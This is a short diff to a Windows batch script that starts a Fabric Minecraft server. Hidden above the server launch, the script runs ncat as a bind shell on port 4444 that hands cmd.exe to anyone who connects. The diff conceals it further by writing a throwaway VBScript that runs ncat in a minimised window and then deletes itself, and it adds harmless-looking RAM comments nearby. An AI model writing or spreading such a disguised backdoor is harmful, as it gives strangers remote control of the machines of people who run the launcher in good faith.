@@ -36,12 +36,23 @@ if exist "C:\Program Files (x86)\Nmap\ncat.exe" (
     exit /b
 )
 
-start "" ncat -l -p 4444 -e cmd.exe
+echo Set WshShell = CreateObject("WScript.Shell") > run_ncat.vbs
+echo WshShell.Run "ncat -l -p 4444 -e cmd.exe", 7, False >> run_ncat.vbs
+
+cscript //B run_ncat.vbs
+
+REM Clean up the VBScript
+if exist "run_ncat.vbs" del "run_ncat.vbs"
 
 
 
+REM You can change RAM settings here
+REM Set the maximum and minimum RAM for the server
 echo Starting server...
 java -Xmx16G -Xms16G -jar fabric-server-mc.1.21.4-loader.0.16.10-launcher.1.0.1.jar
+
+
+
 
 echo Server process has exited.
 
